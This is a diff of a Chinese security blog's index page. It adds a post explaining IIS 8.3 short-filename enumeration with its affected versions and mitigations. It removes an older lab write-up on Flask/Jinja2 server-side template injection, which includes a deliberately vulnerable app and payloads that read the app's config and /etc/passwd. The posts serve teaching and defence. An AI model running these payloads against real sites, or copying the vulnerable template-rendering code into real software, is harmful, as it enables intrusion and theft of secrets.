@@ -258,6 +258,232 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/28/IIS短文件名漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/06/28/IIS短文件名漏洞/" itemprop="url">
+                  IIS短文件名漏洞
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-28T11:39:37+08:00">
+                2018-06-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/06/28/IIS短文件名漏洞/" class="leancloud_visitors" data-flag-title="IIS短文件名漏洞">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-IIS短文件名"><a href="#0x00-IIS短文件名" class="headerlink" title="0x00 IIS短文件名"></a>0x00 IIS短文件名</h2><p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的DOS 8.3 短文件名。</p>
+<p>Windows下查看对应的短文件名，可以使用命令 dir /x</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/iis_shortfilename/short_filename01.png?raw=true" alt=""></p>
+<p>对应短文件名的规律是：</p>
+<ul>
+<li>前六位保留</li>
+<li>所有小写字母均转换成大写字母</li>
+<li>后续字符用~1表示</li>
+<li>后缀最多显示三位，其余的被截断</li>
+<li>长文件名前缀/文件夹名字符长度符合0-9和Aa-Zz范围且需要大于等于9位才会生成短文件名，如果包含空格或者其他部分特殊字符，不论长度均会生成短文件</li>
+</ul>
+<h2 id="0x01-IIS短文件名漏洞"><a href="#0x01-IIS短文件名漏洞" class="headerlink" title="0x01 IIS短文件名漏洞"></a>0x01 IIS短文件名漏洞</h2><p>在IIS的web服务中，有时无法直接访问一些文件，但是我们发送一个存在通配符* 和?的请求,当IIS接收到一个文件路径中包含~的请求时，根据文件是否存在返回值是不同的，我们可以利用这个方法猜解本来无法得到的文件名。</p>
+<ul>
+<li><p>访问构造的某个存在的短文件名，会返回404</p>
+</li>
+<li><p>访问构造的某个不存在的短文件名，会返回400</p>
+</li>
+</ul>
+<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><p>本来受到IIS短文件名漏洞影响的版本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">IIS 1.0，Windows NT 3.51  </span><br><span class="line">IIS 3.0，Windows NT 4.0 Service Pack 2  </span><br><span class="line">IIS 4.0，Windows NT 4.0选项包 </span><br><span class="line">IIS 5.0，Windows 2000  </span><br><span class="line">IIS 5.1，Windows XP Professional和Windows XP Media Center Edition  </span><br><span class="line">IIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition  </span><br><span class="line">IIS 7.0，Windows Server 2008和Windows Vista  </span><br><span class="line">IIS 7.5，Windows 7（远程启用&lt;customErrors&gt;或没有web.config）</span><br><span class="line">IIS 7.5，Windows 2008（经典管道模式）</span><br><span class="line">注意：IIS使用.Net Framework 4时不受影响</span><br></pre></td></tr></table></figure></p>
+<p>以上受影响范围主要是针对HTTP GET方法，且需要同时安装ASP.NET应用程序。</p>
+<p>但是漏洞发现者Soroush Dalili之后再次在IIS7.5和IIS8.0的版本中发现，当使用OPTIONS来代替GET 方法时，如果请求中的短文件名是存在的，IIS会返回一个不一样的错误信息。</p>
+<p>而且在之后的版本中此漏洞也都成功验证。<br>所以影响的版本又加上了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IIS 8.0，Windows 8, Windows Server 2012</span><br><span class="line">IIS 8.5，Windows 8.1,Windows Server 2012 R2</span><br><span class="line">IIS 10.0，Windows 10, Windows Server 2016</span><br></pre></td></tr></table></figure></p>
+<p>所以，短文件名漏洞存在于目前IIS的所有版本中。</p>
+<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><h3 id="在windows10下打开IIS服务"><a href="#在windows10下打开IIS服务" class="headerlink" title="在windows10下打开IIS服务"></a>在windows10下打开IIS服务</h3><p>开始—–&gt;控制面板—-&gt;程序—-&gt;启用或关闭windows功能，勾选以下选项，安装IIS。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/iis_shortfilename/short_filename02.png?raw=true" alt=""></p>
+<p>在浏览器访问ip地址，如果发现IIS windows信息说明安装成功。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/iis_shortfilename/short_filename03.png?raw=true" alt=""></p>
+<p>IIS 安装成功以后，会默认在C盘目录下生成intpub目录，网站的根目录位于C:\inetpub\wwwroot，此时我们创建几个asp文件之后，再使用dir /x查看下根目录是否存在短文件名</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/iis_shortfilename/short_filename04.png?raw=true" alt=""></p>
+<p>我们可以看到，有的文件有短文件名，有的文件没有，这是因为之前提到的，长文件名前缀/文件夹名字符长度符合0-9和Aa-Zz范围且需要大于等于9位才会生成短文件名，如果包含空格或者其他部分特殊字符，不论长度均会生成短文件。</p>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>常用的利用方式有以下几种</p>
+<h3 id="短文件名泄露"><a href="#短文件名泄露" class="headerlink" title="短文件名泄露"></a>短文件名泄露</h3><p>我们可以写python脚本通过HTTP的OPTIONS方法爆破文件名，也可以下载专用的爆破工具来扫描。</p>
+<h3 id="apache下通过短文件名下载"><a href="#apache下通过短文件名下载" class="headerlink" title="apache下通过短文件名下载"></a>apache下通过短文件名下载</h3><p>当Apache运行在windows下，如果创建了一个长文件，那么无需猜解长文件，直接用短文件就可以下载了。</p>
+<h3 id="Net-Framework的拒绝服务攻击"><a href="#Net-Framework的拒绝服务攻击" class="headerlink" title="Net Framework的拒绝服务攻击"></a>Net Framework的拒绝服务攻击</h3><p>当请求文件夹名称包含~1的请求，会导致不存在该文件的.Net framework去递归所有根目录。特别是第一次请求时，会造成的文件读取特别多。用僵尸网络不断向服务器发送此类请求，很容易耗尽对方服务器资源。</p>
+<h2 id="0x05-局限性"><a href="#0x05-局限性" class="headerlink" title="0x05 局限性"></a>0x05 局限性</h2><ul>
+<li><p>1.此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解</p>
+</li>
+<li><p>2.如果文件名本身太短（无短文件名）也是无法猜解的</p>
+</li>
+<li><p>3.如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配</p>
+</li>
+<li><p>4.如果文件夹名前6位字符带点“.”，扫描程序会认为是文件而不是文件夹，最终出现误报</p>
+</li>
+<li><p>5.不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测</p>
+</li>
+</ul>
+<h2 id="0x06-应对"><a href="#0x06-应对" class="headerlink" title="0x06 应对"></a>0x06 应对</h2><h4 id="禁止url中使用“-”或它的Unicode编码"><a href="#禁止url中使用“-”或它的Unicode编码" class="headerlink" title="禁止url中使用“~”或它的Unicode编码"></a>禁止url中使用“~”或它的Unicode编码</h4><h4 id="关闭windows的8-3格式功能"><a href="#关闭windows的8-3格式功能" class="headerlink" title="关闭windows的8.3格式功能"></a>关闭windows的8.3格式功能</h4><ul>
+<li><p>命令行中关闭：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fsutil 8dot3name set 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>注册表中禁用：<br>在注册表中找到HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，代表不创建短文件名格式</p>
+</li>
+</ul>
+<h4 id="升级netFramework至4-0以上版本"><a href="#升级netFramework至4-0以上版本" class="headerlink" title="升级netFramework至4.0以上版本"></a>升级netFramework至4.0以上版本</h4><h4 id="修改注册表禁用短文件名功能"><a href="#修改注册表禁用短文件名功能" class="headerlink" title="修改注册表禁用短文件名功能"></a>修改注册表禁用短文件名功能</h4><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>相对来说这个漏洞比较鸡肋，微软也表示IIS短文件漏洞未达到安全更新标准，需要确定何时在下一个逻辑版本中解决它。</p>
+<p>虽然漏洞的威胁不大，但是正因不严重导致微软没有更新，现在所有版本都存在这个问题，当有人将其与其他漏洞配合起来使用时，也是有可能造成很严重的后果。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/27/机器学习-4-——神经网络/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2347,226 +2573,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/28/SSTI服务器模板注入/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/05/28/SSTI服务器模板注入/" itemprop="url">
-                  SSTI服务器模板注入
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-28T23:17:58+08:00">
-                2018-05-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/05/28/SSTI服务器模板注入/" class="leancloud_visitors" data-flag-title="SSTI服务器模板注入">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间打本校的ctf，有道叫幸运数字的题，只挖到一个xss，看了很久对题完全没有头绪，后来交wp的时候，出题师傅在群里说是SSTI，然后就去百度了一下，复现并学习一下这个漏洞。</p>
-<h2 id="0x01-SSTI服务端模板注入"><a href="#0x01-SSTI服务端模板注入" class="headerlink" title="0x01 SSTI服务端模板注入"></a>0x01 SSTI服务端模板注入</h2><p>服务端模板注入是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
-<p>通常测试模块类型的方式如下图：</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti01.png" alt=""></p>
-<h2 id="0x02-环境配置"><a href="#0x02-环境配置" class="headerlink" title="0x02 环境配置"></a>0x02 环境配置</h2><p>前面两篇正好写了python的后端模块flask和jinja2，这次我们使用flask+jinja2框架来测试一下。</p>
-<p>首先后端是python，所以需要python环境，python在官网下载并安装，配置环境变量即可。</p>
-<p>接着我们安装需要用到的库</p>
-<ul>
-<li>pip install jinja2</li>
-<li>pip install flask</li>
-<li>pip install virtualenv</li>
-</ul>
-<p>只要上述所有库成功安装，环境就配置完毕了。</p>
-<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>我们的环境需要一个run.py文件和一个templates文件夹，templates文件夹内要有一个index.html。</p>
-<p>index.html内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&#123;% block title %&#125;test pages&#123;% endblock %&#125;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;center&gt;</span><br><span class="line">			&lt;p&gt;请输入你的昵称&lt;/p&gt;</span><br><span class="line">			&lt;form method=&quot;post&quot; action=&quot;/check&quot;&gt;</span><br><span class="line"></span><br><span class="line">			&lt;p&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;name&quot; required&gt;</span><br><span class="line">			&lt;/p&gt;</span><br><span class="line">			&lt;br&gt;</span><br><span class="line">			&lt;p&gt;</span><br><span class="line">			&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="line">			&lt;/p&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">	&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<p>可以看到，html中只有一个post型的from需要我们填写提交。</p>
-<p>然后是run.py（注意这次我用了python2.7）:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#python2.7</span><br><span class="line">import jinja2</span><br><span class="line">from flask import Flask,render_template, render_template_string, flash, redirect, url_for, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(__name__)</span><br><span class="line">app.config[&apos;SECRET_KEY&apos;] = &quot;password:123456789&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/check&apos;,methods=[&apos;POST&apos;, &apos;GET&apos;])</span><br><span class="line">def check():</span><br><span class="line">	if request.method == &apos;POST&apos;:</span><br><span class="line">		name = str(request.form[&apos;name&apos;])</span><br><span class="line">		template = u&apos;&apos;&apos;</span><br><span class="line">		&lt;center&gt;</span><br><span class="line">			&lt;p&gt;你好, %s, 欢迎来到我的页面&lt;/p&gt;</span><br><span class="line">			&lt;a href=&quot;/&quot;&gt;点这里退出&lt;/a&gt;</span><br><span class="line">		&lt;/center&gt;</span><br><span class="line">		&apos;&apos;&apos; % (name)</span><br><span class="line">		return render_template_string(template)</span><br><span class="line">		</span><br><span class="line">@app.errorhandler(404)</span><br><span class="line">def page_not_found(e):</span><br><span class="line">	return render_template(&apos;404.html&apos;),404</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p>
-<p>这里python文件实现了将几个页面通过jinja2模块渲染部署，然后添加了一个敏感数据SECRET_KEY一会用得到，剩下的就是将index.html页面post过来的name，在网站check路径的页面中作为字符串输出。</p>
-<p>我们在run.py目录打开命令行先输入python run.py先将服务运行起来：</p>
-<p>然后我们打开浏览器输入127.0.0.1:5000，成功显示index.html中的页面：</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti02.png" alt=""></p>
-<p>我们输入任意字符串，浏览器跳转到127.0.0.1:5000/check目录，并且在网页中输出我们的字符串：</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti03.png" alt=""></p>
-<p>如上几步如果都成功，我们漏洞环境就搭建完成了。</p>
-<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>我们先尝试一下刚才图中的测试数据，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*&apos;7&apos;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>发现结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti04.png" alt=""></p>
-<p>config是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。查看这些配置项目，我们只需注入如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.items() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>发现结果中存在我们刚才故意放进去的敏感信息：</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti05.png" alt=""></p>
-<p>在接下来的步骤之前，我先介绍两个内省实用程序：<strong>mro</strong>以及<strong>subclasses</strong>属性。</p>
-<p><strong>mro</strong>中的MRO(Method Resolution Order)代表着解析方法调用的顺序，它是每个对象元类的一个隐藏属性，当进行内省时会忽略dir输出。</p>
-<p><strong>subclasses</strong>属性在这里作为一种方法被定义为，对每个new-style class“为它的直接子类维持一个弱引用列表”，之后“返回一个包含所有存活引用的列表”。</p>
-<p><strong>mro</strong>允许我们在当前Python环境中追溯对象继承树，之后<strong>subclasses</strong>又让我们回到原点。从一个new-style object开始，例如str类型。使用<strong>mro</strong>我们可以从继承树爬到根对象类，之后在Python环境中使用<strong>subclasses</strong>爬向每一个new-style object。ok，这让我们能够访问加载到当前Python环境下的所有类。这样，我们就可以实现很多功能。</p>
-<p>首先我们要做的第一件事便是选择一个new-style object用于访问object基类。我们可以使用<strong>mro</strong>属性访问对象的继承类。<br>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__ &#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti06.png" alt=""></p>
-<p>得到反馈只有str、basestring和object，按照数组的排序，我们应该选<strong>mro</strong>的第三个，也就是<strong>mro</strong>[2]，接下来我们构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti07.png" alt=""></p>
-<p>可以查看到非常非常多的可访问类，这个时候我们要找到<type 'file'="">类，它是文件系统访问的关键。</type></p>
-<p>然后我们可以用file类的read()方法访问一下当前目录的文本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;./2333.txt&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti08.png" alt=""></p>
-<p>访问敏感目录可以得到很多信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssti/ssti09.png" alt=""></p>
-<p>我们就可以参考目标系统目录结构，对目标系统敏感文件进行访问。</p>
-<h2 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h2><ul>
-<li><a href="https://portswigger.net/blog/server-side-template-injection" target="_blank" rel="noopener">https://portswigger.net/blog/server-side-template-injection</a></li>
-<li><a href="http://www.freebuf.com/articles/web/98619.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/98619.html</a></li>
-<li><a href="https://nvisium.com/blog/2015/12/07/injecting-flask/" target="_blank" rel="noopener">https://nvisium.com/blog/2015/12/07/injecting-flask/</a></li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2616,7 +2622,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">97</span>
+                <span class="site-state-item-count">98</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
